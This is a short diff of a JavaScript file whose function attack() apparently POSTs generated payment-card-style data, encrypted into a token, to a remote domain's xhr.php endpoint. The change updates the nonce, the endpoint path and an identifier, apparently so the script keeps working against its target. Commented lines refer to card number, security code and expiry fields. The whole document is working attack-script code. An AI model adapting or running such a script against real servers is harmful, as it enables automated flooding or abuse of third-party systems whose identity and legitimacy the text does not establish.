@@ -95,7 +95,7 @@ function getRandomDate() {
 }
 
 function attack() {
-    var nonceValue = 'e2cfa1b34d9ce5c808c301f3b5350de1';
+    var nonceValue = 'b1f23502794669b2b0f1c395a0d8c407';
     /*var iptS = $('#so1');    // card number  e.target.value = e.target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();     
     var iptSec = $('#secu');
     var iptExp = $('#exp');
@@ -125,13 +125,13 @@ function attack() {
 
         console.log('POSTing data: ' + JSON.stringify(frmD, null, 2))
 
-        fetch(domain + '/xhr.php', {
+        fetch(domain + '/1xhr.php', {
             method: 'POST',
             headers: {
                 'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
             },
             body: JSON.stringify({
-                o: '35c547698da79',
+                o: '75c8200fac897',
                 tkn: encrypted
             })
         }).then(r => r.json().then(r => {
